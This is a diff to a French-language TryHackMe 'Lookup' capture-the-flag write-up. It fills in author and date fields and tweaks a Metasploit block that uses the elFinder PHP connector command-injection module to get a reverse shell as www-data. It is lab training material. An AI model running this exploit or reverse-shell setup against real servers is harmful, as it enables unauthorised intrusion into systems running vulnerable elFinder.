@@ -1,8 +1,8 @@
 # **TryHackMe - Lookup Write-Up**  
 > **Difficulté** : Facile  
 > **OS** : Linux  
-> **Auteur** : @TonPseudo  
-> **Date** : JJ/MM/AAAA  
+> **Auteur** : HelloLou  
+> **Date** : 30/01/2025  
 
 ---
 
@@ -70,13 +70,13 @@ On utilise **Metasploit** pour automatiser l'exploitation :
 ```bash
 msfconsole
 use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
-set RHOSTS 10.10.16.70
+set RHOSTS 10.10.16.70 (VPN tryhackme)
 set TARGETURI /php/connector.php
-set LHOST 10.11.125.223  # Ton IP Tun0 (VPN)
+set LHOST Ici Ton IP Tun0 (VPN)
 set LPORT 4444
 run
 ```
-💥 **Shell obtenu !**  
+💥 **Shell obtenu !**  (n'oubliez pas de l'activer si vous êtes sur meterpreter, en tapant: shell)
 ```
 meterpreter > whoami
 www-data
